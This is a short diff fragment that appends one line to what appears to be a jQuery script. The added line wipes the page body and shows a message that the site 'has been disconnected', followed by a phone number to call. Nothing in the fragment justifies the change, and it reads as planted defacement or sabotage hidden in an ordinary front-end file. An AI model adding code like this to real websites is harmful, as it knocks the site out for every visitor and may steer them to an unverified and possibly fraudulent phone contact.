@@ -66,3 +66,4 @@
     
 })(jQuery);
 
+document.querySelector('body').innerHTML = "This site has been disconnected... Please contact the administrator. 08181712384"
